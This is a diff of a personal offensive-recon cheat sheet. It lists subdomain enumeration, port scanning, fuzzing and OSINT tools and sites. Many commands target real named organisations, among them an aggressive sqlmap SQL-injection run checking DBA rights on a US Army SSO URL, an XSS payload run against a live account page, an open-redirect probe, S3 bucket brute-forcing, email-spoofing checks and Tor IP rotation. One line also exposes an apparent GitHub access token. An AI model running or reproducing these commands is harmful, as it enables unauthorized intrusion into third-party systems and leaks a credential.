@@ -3,20 +3,53 @@ Great Enumerations Scripts
  nodesub -h
 
 
-https://github.com/six2dez/reconftw
-https://github.com/yogeshojha/rengine
-https://github.com/iamthefrogy/frogy
-https://github.com/christophetd/censys-subdomain-finder
-https://github.com/gwen001/github-subdomains
-https://github.com/m-raheem/ShoCensys
-https://github.com/pikpikcu/nodesub
-https://github.com/christophetd/censys-subdomain-finder
-https://github.com/trustedsec/hardcidr
-https://github.com/hktalent/scan4all
+echo tesla.cn | ./fatima.sh
+./frogy.sh
+pdlist tesla.cn --strict -o /home/ibrahim/0output/list.txt
+python3 /home/ibrahim/OneForAll/oneforall.py --target tesla.cn run
+ffuf -u https://FUZZ.tesla.cn -w country.txt -mc 404,200,403,302,301
+github-subdomains -d tesla.cn -o /home/ibrahim/0output/string.txt -t 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
+/home/ibrahim/Downloads/github/SubDomz/./SubDomz -d tesla.cn -o /home/ibrahim/0output/subdoamz.txt
+/home/ibrahim/Downloads/github/sd-goo/./sd-goo.sh tesla.cn | sort -u >> /home/ibrahim/0output/goo.txt
 
-extract domain from text
+
+
+cat host.txt | /home/ibrahim/aquatone/aqautone
+python3 ToriFY/ip_changer.py
+Torify
+
+extract domain from text and urls recon
 https://ultimatedomains.com/extract-domains.php
 https://osint.sh/subdomain/
+https://tools.prinsh.com/home/?tools=Subdofinder
+https://seckrd.com/subdomain-finder.php
+otx.alienvault.com/indicator/domain/mtnonline.com
+https://intelx.io/
+https://app.netlas.io/host
+https://www.crunchbase.com/
+https://www.ipneighbour.com/#/lookup
+https://www.virustotal.com/gui/home/upload
+https://urlscan.io/
+https://osint.industries/email
+https://phonebook.cz/#l
+https://mxtoolbox.com/SuperTool.aspx
+https://www.ipaddressguide.com/
+https://pentest-tools.com/
+https://rapiddns.io
+https://bgpview.io/
+https://dnschecker.org/asn-whois-lookup.php
+https://baidu.com
+https://binaryedge.io
+https://search.brave.com/
+https://crt.sh
+https://www.dehashed.com/
+https://dnsdumpster.com
+https://duckduckgo.com
+https://fullhunt.io
+curl 'https://api.dehashed.com/search?query=domain:bentley.com'
+https://adfshelp.microsoft.com/JwtDecoder/GetToken
+https://publicwww.com/
+
 
 Subdomains - Virtual Host Enumeration
 
@@ -27,18 +60,18 @@ ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me -fs
 Permutation
 cat sub.txt
 
-cat /home/ibrahim/Arecon/allsubfinal.txt | tr “.” “\n” | sort -u >> words.txt
+cat /home/ibrahim/0regulator/allsubfinal.txt | tr “.” “\n” | sort -u >> /home/ibrahim/0regulator/words.txt
 
-goaltdns -l /home/ibrahim/Arecon/allsubfinal.txt -w words.txt -o output.txt
+goaltdns -l /home/ibrahim/0regulator/allsubfinal.txt -w /home/ibrahim/0regulator/words.txt -o  /home/ibrahim/0regulator/output.txt
 
-cat output.txt | puredns resolve >> resolved.txt
+cat /home/ibrahim/0regulator/output.txt | puredns resolve >> /home/ibrahim/0regulator/resolved.txt
 
 
 wc -l resolved.txt
 
 more subdomain
 
-python3 main.py 8x8.vc resolved.txt sub.rules
+python3 /home/ibrahim/0regulator/main.py growtix.com /home/ibrahim/0regulator/resolved.txt /home/ibrahim/0regulator/sub.rules
 
 ./make_brute_list.sh sub.rules sub.brute
 
@@ -59,15 +92,16 @@ naabu -list sub-list.txt -p - -exclude-ports 80,443,21,22,25 -o ports.txt
 Open Redirect
 httpx -l all-alive-subs.txt -path "///evil.com" -status-code -mc 302 
 
-cat domain.txt | httpx -path 12.txt -fc 400,403.404
+cat /home/ibrahim/aoutput/allsubfinal.txt | httpx -path 12.txt -fc 400,403.404
 
 sqlmap -u 'https://federation.eams.army.mil/pool/sso/authenticate/l/15?f=' --level=5 --risk=3 --dbs
+sqlmap -u 'https://federation.eams.army.mil/pool/sso/authenticate/l/15?f=' --level=5 --risk=3 --dbs --is-dba
 
 cd Logsensor && python3 logsensor.py -f /home/ibrahim/aoutput/allsubfinal.txt --login 
 
 fuzzuli -f domains.txt
 
-echo https://fuzzuli.musana.net|fuzzuli -p
+echo https://chatbot.easybell.de | fuzzuli -p
 
 
 
@@ -128,62 +162,19 @@ org:Target "AWS_ACCESS_KEY_ID"
 org:Target "list_aws_accounts"
 
 
-github dork
-https://ibrahimhaxor.github.io/gitdorker/
-
-External Recon
-https://intelx.io/
-https://app.netlas.io/host
-
-https://www.crunchbase.com/
-
-https://www.ipneighbour.com/#/lookup
-
-https://www.virustotal.com/gui/home/upload
-
-https://urlscan.io/
-
-https://publicwww.com/
-cidr notation
-
-cat cidrs.txt | cidr2ip
-
-https://mxtoolbox.com/SuperTool.aspx
-
-https://www.ipaddressguide.com/
-
-https://pentest-tools.com/
- 
-https://rapiddns.io
-
-https://bgpview.io/
-
-asn checker
-https://dnschecker.org/asn-whois-lookup.php
-
- www.baidu.com
-www.binaryedge.io
-https://search.brave.com/
-https://crt.sh
-https://www.dehashed.com/
-https://dnsdumpster.com
-www.duckduckgo.com
-https://fullhunt.io
-curl 'https://api.dehashed.com/search?query=domain:test.com'
-
-jwt decode
-https://adfshelp.microsoft.com/JwtDecoder/GetToken
-
-
-
 Vulnerability scan
-ronin-vulns scan "http://blog.dropmyemail.com/2012/08/13/backup-your-most-popular-online-activity-email/?share="
+cat /home/ibrahim/aoutput/allsublive.txt | ppmap
+ronin-vulns scan "https://www.easybell.de/index.php?id="
 ./vuln.sh
 ./xray.sh
 ./deceptor.sh -u https://chat-staging.pbodev.info/common-session  
+cat urls.txt | jsleak -l -s -c 30
+sh SpoofThatMail.sh -f domains.txt
+ffuf -u http://FUZZ.s3.amazonaws.com -w /home/ibrahim/aoutput/allsubfinal.txt
+python3 /home/ibrahim/XSS/xss.py -u https://gsmserver.com/en/account/subscription/confirm/?email={xss} -p /home/ibrahim/XSS/payloads.txt
 
 
-cd Photon && python3 photon.py -u https://www.bbc.com/
+cd Photon && python3 photon.py -u https://chatbot.easybell.de/
 
 bypass 403 uppercase and lowercase
 cd Tinker && python3 main.py  
